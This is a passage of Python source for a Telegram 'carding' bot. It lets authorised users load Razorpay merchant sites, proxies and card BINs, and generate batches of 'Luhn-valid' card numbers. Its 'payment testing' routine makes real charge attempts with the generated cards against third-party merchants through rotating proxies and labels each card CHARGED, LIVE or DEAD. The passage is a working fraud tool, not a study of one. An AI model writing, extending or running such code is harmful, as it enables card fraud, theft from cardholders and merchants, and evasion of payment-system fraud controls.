            f"{e('error')} No sites to remove.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(sites):
                await redis.lrem(RK_SITES, 1, sites[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed: <code>{safe(sites[idx])}</code>",
                    parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass

    keyboard = []
    for idx, site in enumerate(sites):
        short = (site[:45] + "…") if len(site) > 45 else site
        keyboard.append([btn(f"🗑 {short}", f"rmsite_{idx}")])
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} <b>Select site to remove:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))



# ═══════════════════════════════════════════════════
#           PROXY MANAGEMENT
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_addpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/addpxy proxy1 proxy2 …</code>\n\n"
            f"{e('proxy')} <b>Supported formats:</b>\n"
            f"  1️⃣ <code>ip:port</code>\n"
            f"  2️⃣ <code>ip:port:user:pass</code>\n"
            f"  3️⃣ <code>user:pass@ip:port</code>\n"
            f"  4️⃣ <code>socks5://user:pass@ip:port</code>",
            parse_mode=ParseMode.HTML)
        return

    existing = set(await redis.lrange(RK_PROXIES, 0, -1))
    added = skipped = bad = 0
    for raw in context.args:
        info = parse_proxy(raw)
        if not info:
            bad += 1
            continue
        if raw in existing:
            skipped += 1
            continue
        await redis.lpush(RK_PROXIES, raw)
        existing.add(raw)
        added += 1

    total = await redis.llen(RK_PROXIES)
    await update.message.reply_text(
        f"{e('check')} <b>Proxies Added: {added}</b>\n"
        f"  {e('warning')} Invalid: <code>{bad}</code>\n"
        f"  {e('star')} Duplicate: <code>{skipped}</code>\n"
        f"  {e('proxy')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies loaded. Use <code>/addpxy</code>.",
            parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(p)}</code>" for i, p in enumerate(proxies, 1))
    await update.message.reply_text(
        f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_testpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Test all loaded proxies for connectivity."""
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies loaded.", parse_mode=ParseMode.HTML)
        return

    msg = await update.message.reply_text(
        f"{e('loading')} Testing {len(proxies)} proxies…", parse_mode=ParseMode.HTML)

    results = []
    good = bad = 0
    for raw in proxies:
        ok, info, lat = await test_proxy(raw)
        if ok:
            good += 1
            results.append(f"  {e('live')} <code>{safe(raw[:35])}</code>\n     └ {safe(info)} | <code>{lat}ms</code>")
        else:
            bad += 1
            results.append(f"  {e('offline')} <code>{safe(raw[:35])}</code>\n     └ {safe(info)}")

    text = (
        f"{e('proxy')} <b>Proxy Test Results</b>\n\n"
        + "\n\n".join(results)
        + f"\n\n{e('check')} Live: <code>{good}</code>  {e('cross')} Dead: <code>{bad}</code>"
    )
    await msg.edit_text(text, parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies to remove.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(proxies):
                await redis.lrem(RK_PROXIES, 1, proxies[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed proxy <code>#{idx+1}</code>.",
                    parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass

    keyboard = []
    for idx, proxy in enumerate(proxies):
        short = (proxy[:40] + "…") if len(proxy) > 40 else proxy
        keyboard.append([btn(f"🗑 {short}", f"rmpxy_{idx}")])
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} <b>Select proxy to remove:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))


@require_auth
async def cmd_clrpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Clear all proxies."""
    await redis.delete(RK_PROXIES)
    await update.message.reply_text(
        f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML)



# ═══════════════════════════════════════════════════
#           BIN MANAGEMENT
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_addbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/addbim BIN1 BIN2 …</code>\n"
            f"<b>Examples:</b> <code>/addbim 411111  5xxxxx|12|25|rnd</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = set(await redis.lrange(RK_BINS, 0, -1))
    added = bad = dupe = 0
    for bp in context.args:
        ok, err = validate_bin(bp)
        if not ok:
            bad += 1
            continue
        if bp in existing:
            dupe += 1
            continue
        await redis.lpush(RK_BINS, bp)
        existing.add(bp)
        added += 1
    total = await redis.llen(RK_BINS)
    await update.message.reply_text(
        f"{e('check')} <b>BINs Added: {added}</b>\n"
        f"  {e('warning')} Invalid: <code>{bad}</code>  Dupe: <code>{dupe}</code>\n"
        f"  {e('bin')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_chkbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs loaded. Use <code>/addbim</code>.",
            parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(b)}</code>" for i, b in enumerate(bins, 1))
    await update.message.reply_text(
        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmbin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs to remove.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(bins):
                await redis.lrem(RK_BINS, 1, bins[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed BIN: <code>{safe(bins[idx])}</code>",
                    parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    keyboard = []
    for idx, b in enumerate(bins):
        keyboard.append([btn(f"🗑 {b}", f"rmbin_{idx}")])
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} Select BIN to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))


@require_auth
async def cmd_binlookup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """BIN lookup via binlist.net."""
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/binlookup 411111</code>",
            parse_mode=ParseMode.HTML)
        return
    bin6 = context.args[0][:8]
    msg  = await update.message.reply_text(
        f"{e('loading')} Looking up BIN <code>{safe(bin6)}</code>…",
        parse_mode=ParseMode.HTML)
    info = await lookup_bin(bin6)
    await msg.edit_text(
        f"{e('bin')} <b>BIN Lookup: <code>{safe(bin6)}</code></b>\n\n"
        f"  {e('card')} Scheme:  <code>{info['scheme']}</code>\n"
        f"  {e('star')} Type:    <code>{info['type']}</code>\n"
        f"  {e('diamond')} Brand:  <code>{info['brand'] or 'N/A'}</code>\n"
        f"  {e('money')} Bank:    <code>{safe(info['bank'])}</code>\n"
        f"  {e('location')} Country: <code>{safe(info['country'])}</code> {info['emoji']}",
        parse_mode=ParseMode.HTML)



# ═══════════════════════════════════════════════════
#      PAYMENT TESTING  (real, batched)
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_fuck(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Launch payment testing workflow."""
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS,  0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites loaded. Use <code>/addsite</code> first.",
            parse_mode=ParseMode.HTML)
        return
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs loaded. Use <code>/addbim</code> first.",
            parse_mode=ParseMode.HTML)
        return

    keyboard = InlineKeyboardMarkup([
        [btn("₹1  — Micro",  "test_100"),
         btn("₹5  — Small",  "test_500")],
        [btn("₹10 — Basic",  "test_1000"),
         btn("₹50 — Medium", "test_5000")],
        [btn("₹100 — High",  "test_10000")],
        [btn(f"{e('cross')} Cancel", "cancel")],
    ])

    proxies = await redis.llen(RK_PROXIES)
    await update.message.reply_text(
        f"{e('fire')} <b>Payment Testing</b>\n\n"
        f"  {e('site')} Sites:   <code>{len(sites)}</code>\n"
        f"  {e('bin')} BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n\n"
        f"{e('money')} <b>Select test amount (INR):</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard)


async def run_payment_test(
    chat_id: int,
    amount_paise: int,
    context: ContextTypes.DEFAULT_TYPE,
) -> None:
    """
    Real batched Razorpay payment testing.
    Batches: BATCH_SIZE cards per batch, BATCH_DELAY between batches.
    Max 10 batches per run.
    """
    MAX_BATCHES = 10

    sites   = await redis.lrange(RK_SITES,   0, -1)
    bins    = await redis.lrange(RK_BINS,     0, -1)
    proxies = await redis.lrange(RK_PROXIES,  0, -1)

    if not sites or not bins:
        await context.bot.send_message(
            chat_id, f"{e('error')} Missing sites or BINs.", parse_mode=ParseMode.HTML)
        return

    # Generate cards — 1 per BIN, up to BATCH_SIZE * MAX_BATCHES
    max_cards = min(BATCH_SIZE * MAX_BATCHES, len(bins) * 3)
    cards: List[str] = []
    for bp in bins:
        for card in generate_cards_streaming(bp, min(3, max(1, max_cards // len(bins)))):
            cards.append(card)
            if len(cards) >= max_cards:
                break
        if len(cards) >= max_cards:
            break

    if not cards:
        await context.bot.send_message(
            chat_id, f"{e('error')} Could not generate cards from BINs.",
            parse_mode=ParseMode.HTML)
        return

    batches = [cards[i:i+BATCH_SIZE] for i in range(0, len(cards), BATCH_SIZE)]
    batches = batches[:MAX_BATCHES]
    amt_inr  = amount_paise // 100

    status_msg = await context.bot.send_message(
        chat_id,
        f"{e('cooking')} <b>Payment Test Started</b>\n\n"
        f"  {e('money')} Amount:  <code>₹{amt_inr}</code>\n"
        f"  {e('card')} Cards:   <code>{len(cards)}</code>\n"
        f"  {e('site')} Sites:   <code>{len(sites)}</code>\n"
        f"  {e('mass')} Batches: <code>{len(batches)}</code> × {BATCH_SIZE}\n"
        f"  {e('proxy')} Proxies: <code>{len(proxies)}</code>\n\n"
        f"{e('loading')} Testing…",
        parse_mode=ParseMode.HTML,
    )

    # Register as active
    active_tests[chat_id] = True

    total_ok = total_charged = total_fail = 0
    processed = 0

    # First do a site liveness pre-check
    live_sites: List[Tuple[str, str]] = []
    for site in sites:
        proxy_url = get_random_proxy_url(proxies)
        is_live, rzp_key, _ = await check_site_live(site, proxy_url)
        if is_live:
            live_sites.append((site, rzp_key))

    if not live_sites:
        await status_msg.edit_text(
            f"{e('offline')} <b>No live Razorpay sites found!</b>\n\n"
            f"All {len(sites)} site(s) failed liveness check.\n"
            f"Add working sites with /addsite.",
            parse_mode=ParseMode.HTML)
        active_tests.pop(chat_id, None)
        return

    await context.bot.send_message(
        chat_id,
        f"{e('live')} <b>{len(live_sites)}/{len(sites)} sites live</b>\n"
        + "\n".join(f"  {e('check')} <code>{safe(s[0][:55])}</code>" for s in live_sites),
        parse_mode=ParseMode.HTML,
    )

    for b_idx, batch in enumerate(batches, 1):
        if not active_tests.get(chat_id):
            await context.bot.send_message(
                chat_id, f"{e('stop')} Test stopped by user.", parse_mode=ParseMode.HTML)
            break

        batch_results: List[str] = []

        for card in batch:
            if not active_tests.get(chat_id):
                break

            site_url, rzp_key = random.choice(live_sites)
            proxy_url = get_random_proxy_url(proxies)

            result = await attempt_razorpay_payment(
                site_url, rzp_key, card, amount_paise, proxy_url)

            processed += 1
            await redis.incr("bot:stats:total_payments")

            if result["success"] and result["charge"]:
                total_charged += 1
                icon = e('success')
                tag  = "CHARGED"
            elif result["success"]:
                total_ok += 1
                icon = e('approved')
                tag  = "LIVE"
            else:
                total_fail += 1
                icon = e('declined')
                tag  = "DEAD"

            batch_results.append(
                f"{icon} <b>{tag}</b>  <code>{card}</code>\n"
                f"     {e('gateway')} {safe(site_url[:50])}\n"
                f"     {e('info')} {safe(result['response'][:70])} "
                f"[<code>{result['code']}</code>] {e('time')}{result.get('timestamp','')}"
            )

        if batch_results:
            batch_text = (
                f"{e('mass')} <b>Batch {b_idx}/{len(batches)}</b>  "
                f"({e('live')}{total_ok+total_charged} live | "
                f"{e('declined')}{total_fail} dead)\n\n"
                + "\n\n".join(batch_results)
            )
            await context.bot.send_message(chat_id, batch_text, parse_mode=ParseMode.HTML)

        if b_idx < len(batches) and active_tests.get(chat_id):
            await asyncio.sleep(BATCH_DELAY)

    active_tests.pop(chat_id, None)

    await status_msg.edit_text(
        f"{e('trophy')} <b>Payment Test Complete</b>\n\n"
        f"  {e('card')} Tested:   <code>{processed}</code>\n"
        f"  {e('success')} Charged:  <code>{total_charged}</code>\n"
        f"  {e('approved')} Live:     <code>{total_ok}</code>\n"
        f"  {e('declined')} Dead:     <code>{total_fail}</code>\n"
        f"  {e('money')} Amount:   <code>₹{amt_inr}</code>\n"
        f"  {e('mass')} Batches:  <code>{len(batches)}</code>",
        parse_mode=ParseMode.HTML,
    )


@require_auth
async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop an active payment test."""
    cid = update.effective_chat.id
    if active_tests.get(cid):
        active_tests[cid] = False
        await update.message.reply_text(
            f"{e('stop')} Stopping active test…", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"{e('info')} No active test running.", parse_mode=ParseMode.HTML)



# ═══════════════════════════════════════════════════
#          /gen  — card generation (public with rate limit)
# ═══════════════════════════════════════════════════

async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id

    # Auth check — only authorized users may generate
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return

    ok, msg_rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(
            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
        return

    if not context.args:
        await update.message.reply_text(
            f"{e('card')} <b>Usage:</b> <code>/gen BIN amount</code>\n"
            f"<b>Example:</b> <code>/gen 411111 100</code>",
            parse_mode=ParseMode.HTML)
        return

    bin_pattern = context.args[0]
    try:
        amount = int(context.args[1]) if len(context.args) > 1 else 10
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Amount must be a number.", parse_mode=ParseMode.HTML)
        return

    if amount < 1 or amount > MAX_LIMIT:
        await update.message.reply_text(
            f"{e('error')} Amount must be 1–{MAX_LIMIT:,}.", parse_mode=ParseMode.HTML)
        return

    ok2, err = validate_bin(bin_pattern)
    if not ok2:
        await update.message.reply_text(
            f"{e('error')} {err}", parse_mode=ParseMode.HTML)
        return

    # BIN info lookup
    bin6 = bin_pattern.split("|")[0][:8]
    bin_info = await lookup_bin(bin6)

    status = await update.message.reply_text(
        f"{e('loading')} <b>Generating {amount:,} cards…</b>\n"
        f"  {e('bin')} BIN: <code>{safe(bin6)}</code>  {bin_info['scheme']} | {safe(bin_info['bank'])} | {safe(bin_info['country'])} {bin_info['emoji']}",
        parse_mode=ParseMode.HTML)

    bin_display  = bin_pattern.split("|")[0]
    file_count   = 0
    cards_count  = 0
    current_chunk: List[str] = []

    try:
        for card in generate_cards_streaming(bin_pattern, amount):
            current_chunk.append(card)
            cards_count += 1

            if len(current_chunk) >= MAX_LINES_PER_FILE:
                file_count += 1
                bio = BytesIO("\n".join(current_chunk).encode())
                bio.name = f"gen_{bin_display}_p{file_count}.txt"
                bio.seek(0)
                await _send_doc(update.message, bio, file_count, len(current_chunk))
                current_chunk = []
                await asyncio.sleep(SEND_DELAY)

        if current_chunk:
            file_count += 1
            bio = BytesIO("\n".join(current_chunk).encode())
            bio.name = f"gen_{bin_display}_p{file_count}.txt"
            bio.seek(0)
            await _send_doc(update.message, bio, file_count, len(current_chunk))

        # Update stats
        await redis.hset(RK_STATS, "total_generated",
            str(int(await redis.hget(RK_STATS, "total_generated") or 0) + cards_count))

        await status.edit_text(
            f"{e('success')} <b>Generated {cards_count:,} cards in {file_count} file(s)</b>\n"
            f"  {e('bin')} BIN: <code>{safe(bin_display)}</code>\n"
            f"  {e('card')} Scheme: <code>{bin_info['scheme']}</code>  |  "
            f"{e('money')} Bank: <code>{safe(bin_info['bank'])}</code>\n"
            f"  {e('location')} Country: <code>{safe(bin_info['country'])}</code> {bin_info['emoji']}",
            parse_mode=ParseMode.HTML)

    except Exception as ex:
        logger.exception("gen error")
        await status.edit_text(
            f"{e('error')} Generation failed: {safe(str(ex)[:100])}",
            parse_mode=ParseMode.HTML)


async def _send_doc(message, bio: BytesIO, part: int, count: int) -> None:
    """Send document with retry."""
    cap = (
        f"{e('check')} <b>Part {part}</b> — {count:,} cards\n"
        f"  {e('fire')} Luhn-valid • Future expiry"
    )
    for attempt in range(2):
        try:
            bio.seek(0)
            await message.reply_document(document=bio, caption=cap, parse_mode=ParseMode.HTML)
            return
        except Exception as ex:
            logger.error(f"Doc send attempt {attempt+1} failed: {ex}")
            if attempt == 0:
                await asyncio.sleep(1.5)


# ═══════════════════════════════════════════════════
#          /split — file splitting (public)
# ═══════════════════════════════════════════════════

async def cmd_split(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return

    ok, msg_rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(
            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
        return

    if not context.args:
        await update.message.reply_text(
            f"{e('mass')} <b>Usage:</b> Reply to a .txt file with <code>/split 5</code>",
            parse_mode=ParseMode.HTML)
        return

    try:
        parts_count = int(context.args[0])
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Parts must be a number.", parse_mode=ParseMode.HTML)
        return

    if parts_count < 2 or parts_count > MAX_SPLIT_PARTS:
        await update.message.reply_text(
            f"{e('error')} Parts must be 2–{MAX_SPLIT_PARTS}.", parse_mode=ParseMode.HTML)
        return

    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text(
            f"{e('error')} Reply to a <code>.txt</code> file with this command.",
            parse_mode=ParseMode.HTML)
        return

    doc = replied.document
    filename = doc.file_name or "file.txt"
    if not filename.lower().endswith(".txt"):
        await update.message.reply_text(
            f"{e('error')} Only <code>.txt</code> files supported.",
            parse_mode=ParseMode.HTML)
        return

    status = await update.message.reply_text(
        f"{e('loading')} Downloading file…", parse_mode=ParseMode.HTML)

    try:
        buf = BytesIO()
        tgfile = await doc.get_file()
        await tgfile.download_to_memory(out=buf)
        buf.seek(0)
        try:
            content = buf.read().decode("utf-8")
        except UnicodeDecodeError:
            buf.seek(0)
            content = buf.read().decode("utf-8", errors="replace")

        lines = [x.strip() for x in content.splitlines() if x.strip()]
        if not lines:
            await status.edit_text(f"{e('error')} File is empty.", parse_mode=ParseMode.HTML)
            return
        if parts_count > len(lines):
            await status.edit_text(
                f"{e('error')} Only {len(lines):,} lines — can't split into {parts_count} parts.",
                parse_mode=ParseMode.HTML)
            return

        chunk_size = math.ceil(len(lines) / parts_count)
        chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]
        base   = filename[:-4]

        await status.edit_text(
            f"{e('loading')} Sending {len(chunks)} parts…", parse_mode=ParseMode.HTML)

        for idx, chunk in enumerate(chunks, 1):
            part_bio  = BytesIO("\n".join(chunk).encode())
            part_bio.name = f"{base}_p{idx}of{len(chunks)}.txt"
            part_bio.seek(0)
            await _send_doc(update.message, part_bio, idx, len(chunk))
            await asyncio.sleep(SEND_DELAY)

        await status.edit_text(
            f"{e('success')} Split <code>{len(lines):,}</code> lines into <b>{len(chunks)}</b> parts.",
            parse_mode=ParseMode.HTML)

    except Exception as ex:
        logger.exception("split error")
        await status.edit_text(
            f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)



# ═══════════════════════════════════════════════════
#          /stats  — bot statistics
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites    = await redis.llen(RK_SITES)
    proxies  = await redis.llen(RK_PROXIES)
    bins     = await redis.llen(RK_BINS)
    sudo_ct  = len(await redis.smembers(RK_SUDO))
    gen      = await redis.hget(RK_STATS, "total_generated") or "0"
    pays     = await redis.hget(RK_STATS, "total_payments")  or "0"

    await update.message.reply_text(
        f"{e('stats')} <b>Bot Statistics</b>\n\n"
        f"  {e('site')} Sites:         <code>{sites}</code>\n"
        f"  {e('proxy')} Proxies:      <code>{proxies}</code>\n"
        f"  {e('bin')} BINs:          <code>{bins}</code>\n"
        f"  {e('crown')} Sudo Users:  <code>{sudo_ct}</code>\n\n"
        f"  {e('card')} Cards Gen:    <code>{gen}</code>\n"
        f"  {e('money')} Payments:    <code>{pays}</code>\n\n"
        f"  {e('tds')} Redis:        {e('live')} Connected\n"
        f"  {e('fire')} Version:      <code>v4.0</code>",
        parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════
#   /bhosade — HIDDEN full admin command list
#   Only shown to authorized users; not visible to others
# ═══════════════════════════════════════════════════

async def cmd_bhosade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        # Silently ignore — no error message to avoid info leak
        return

    is_admin = uid == ADMIN_USER_ID
    owner_cmds = (
        f"\n{e('crown')} <b>Owner Commands</b>\n"
        f"  <code>/sudo &lt;id&gt;</code>    — Grant sudo\n"
        f"  <code>/unsudo &lt;id&gt;</code>  — Revoke sudo\n"
        f"  <code>/sudolist</code>     — List sudo users\n"
        if is_admin else ""
    )

    text = (
        f"{e('fire')} <b>Full Command Reference</b>\n"
        f"{e('lock')} <i>Authorized users only</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{owner_cmds}"
        f"\n{e('site')} <b>Site Management</b>\n"
        f"  <code>/addsite &lt;url&gt;</code>  — Add Razorpay site\n"
        f"  <code>/live</code>            — List sites\n"
        f"  <code>/checksite</code>       — Live-check all sites\n"
        f"  <code>/rmsite [idx]</code>    — Remove site\n"
        f"\n{e('proxy')} <b>Proxy Management</b>\n"
        f"  <code>/addpxy &lt;p1 p2…&gt;</code> — Add proxies\n"
        f"  <code>/proxy</code>           — List proxies\n"
        f"  <code>/testpxy</code>         — Test all proxies\n"
        f"  <code>/rmpxy [idx]</code>     — Remove proxy\n"
        f"  <code>/clrpxy</code>          — Clear all proxies\n"
        f"\n{e('bin')} <b>BIN Management</b>\n"
        f"  <code>/addbim &lt;BINs&gt;</code>  — Add BINs\n"
        f"  <code>/chkbim</code>          — List BINs\n"
        f"  <code>/rmbin [idx]</code>     — Remove BIN\n"
        f"  <code>/binlookup &lt;BIN&gt;</code> — Lookup BIN info\n"
        f"\n{e('money')} <b>Payment Testing</b>\n"
        f"  <code>/fuck</code>            — Start test workflow\n"
        f"  <code>/stop</code>            — Stop active test\n"
        f"\n{e('stats')} <b>Info &amp; Utilities</b>\n"
        f"  <code>/stats</code>           — Bot statistics\n"
        f"  <code>/gen &lt;BIN&gt; [amt]</code> — Generate cards\n"
        f"  <code>/split &lt;n&gt;</code>       — Split .txt file\n"
        f"  <code>/start</code>           — Main menu\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════
#     /help  and  /info  (public, rate-limited info)
# ═══════════════════════════════════════════════════

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        f"{e('search')} <b>Quick Help</b>\n\n"
        f"{e('card')} <code>/gen BIN amount</code> — Generate cards\n"
        f"  Example: <code>/gen 411111 100</code>\n"
        f"  Pattern: <code>/gen 5xxxxx|12|25|rnd 500</code>\n\n"
        f"{e('mass')} <code>/split N</code> — Split a .txt file\n"
        f"  Reply to a file: <code>/split 5</code>\n\n"
        f"{e('star')} Supports Visa, MC, Amex, Discover, Diners, RuPay\n"
        f"{e('check')} 100%% Luhn-valid • Future expiry • Correct CVV",
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard())


async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        f"{e('info')} <b>Bot Info</b>\n\n"
        f"  {e('fire')} Version:   <code>v4.0</code>\n"
        f"  {e('tds')} Redis:     {e('live')} Upstash\n"
        f"  {e('shield')} Proxy:   4 formats supported\n"
        f"  {e('card')} Cards:    up to <code>{MAX_LIMIT:,}</code>/req\n"
        f"  {e('mass')} Batch:    <code>{BATCH_SIZE}</code> cards/batch\n"
        f"  {e('clock')} Rate:     <code>{RATE_LIMIT}</code> req/{RATE_WINDOW}s\n"
        f"  {e('bolt')} Engine:   <code>PTB v20+ / Python 3.10+</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard())



# ═══════════════════════════════════════════════════
#          INLINE BUTTON CALLBACKS
# ═══════════════════════════════════════════════════

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return
    await query.answer()

    uid  = query.from_user.id
    data = query.data
    chat_id = query.message.chat_id

    # Auth guard
    if not await is_authorized(uid):
        await query.answer(f"🔐 Access denied", show_alert=True)
        return

    # ── Site removal ──────────────────────────────
    if data.startswith("rmsite_"):
        idx   = int(data.split("_")[1])
        sites = await redis.lrange(RK_SITES, 0, -1)
        if 0 <= idx < len(sites):
            target = sites[idx]
            await redis.lrem(RK_SITES, 1, target)
            await query.edit_message_text(
                f"{e('check')} Site removed:\n<code>{safe(target)}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── Proxy removal ─────────────────────────────
    if data.startswith("rmpxy_"):
        idx     = int(data.split("_")[1])
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        if 0 <= idx < len(proxies):
            target = proxies[idx]
            await redis.lrem(RK_PROXIES, 1, target)
            await query.edit_message_text(
                f"{e('check')} Proxy removed:\n<code>{safe(target)}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── BIN removal ───────────────────────────────
    if data.startswith("rmbin_"):
        idx  = int(data.split("_")[1])
        bins = await redis.lrange(RK_BINS, 0, -1)
        if 0 <= idx < len(bins):
            target = bins[idx]
            await redis.lrem(RK_BINS, 1, target)
            await query.edit_message_text(
                f"{e('check')} BIN removed: <code>{safe(target)}</code>",
                parse_mode=ParseMode.HTML)
        return

    # ── Payment test trigger ──────────────────────
    if data.startswith("test_"):
        amount_paise = int(data.split("_")[1])
        amt_inr      = amount_paise // 100
        await query.edit_message_text(
            f"{e('cooking')} <b>Launching payment test…</b>\n\n"
            f"  {e('money')} Amount: <code>₹{amt_inr}</code>\n"
            f"  {e('loading')} Checking sites & proxies…",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(
            run_payment_test(chat_id, amount_paise, context))
        return

    # ── Menu navigation ───────────────────────────
    if data == "cancel":
        await query.edit_message_text(
            f"{e('check')} Cancelled.", parse_mode=ParseMode.HTML)
        return

    if data == "menu_test":
        sites = await redis.llen(RK_SITES)
        bins  = await redis.llen(RK_BINS)
        if sites == 0 or bins == 0:
            await query.edit_message_text(
                f"{e('error')} Need at least 1 site and 1 BIN.\n"
                f"Use <code>/addsite</code> and <code>/addbim</code>.",
                parse_mode=ParseMode.HTML)
            return
        keyboard = InlineKeyboardMarkup([
            [btn("₹1",  "test_100"),  btn("₹5",  "test_500")],
            [btn("₹10", "test_1000"), btn("₹50", "test_5000")],
            [btn("₹100","test_10000")],
            [btn(f"{e('cross')} Cancel", "cancel")],
        ])
        await query.edit_message_text(
            f"{e('money')} <b>Select test amount:</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard)
        return

    if data == "menu_sites":
        sites = await redis.lrange(RK_SITES, 0, -1)
        if not sites:
            text = f"{e('error')} No sites loaded."
        else:
            text = (f"{e('site')} <b>Sites ({len(sites)})</b>\n\n"
                    + "\n".join(f"  {i}. <code>{safe(s)}</code>"
                                for i, s in enumerate(sites, 1)))
